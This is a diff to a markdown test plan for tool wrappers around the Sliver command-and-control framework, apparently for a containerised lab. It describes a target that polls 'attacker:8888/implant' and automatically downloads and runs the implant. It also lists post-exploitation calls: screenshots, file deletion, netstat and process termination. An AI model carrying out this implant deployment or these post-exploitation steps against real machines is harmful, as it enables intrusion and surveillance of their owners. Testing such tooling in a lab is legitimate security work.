@@ -104,7 +104,7 @@ Call `sliver_implants`. Should be empty again.
 
 ## Phase 4: Implant deployment and interaction
 
-The target container is already polling `http://attacker:8888/implant` every 2 seconds. Generate an implant, serve it, and the target will auto-download and execute it.
+The target container is already polling `http://attacker:8888/implant` every 2 seconds. Generate an implant and copy it to the path the target is polling for. The target container is already polling `http://attacker:8888/implant` every 2 seconds — once we serve the binary there, the target will download and execute it.
 
 ### Test 19 — Generate and deploy implant to target
 Generate a new implant with:
@@ -175,7 +175,11 @@ Call `sliver_netstat` on the beacon.
 Call `sliver_rm` on the beacon with path=`/tmp/pi-sliver-test`, recursive=`true`.
 `[PASS] sliver_rm` if successful.
 
-### Test 33 — sliver_terminate
+### Test 33 — sliver_screenshot
+Call `sliver_screenshot` on the beacon. This may fail on headless targets — that's ok.
+`[PASS] sliver_screenshot` if it returns data or a clear 'no display' error.
+
+### Test 34 — sliver_terminate (LAST)
 Find the implant's own PID from `sliver_ps` output, then call `sliver_terminate` with that PID.
 `[PASS] sliver_terminate` if successful.
 
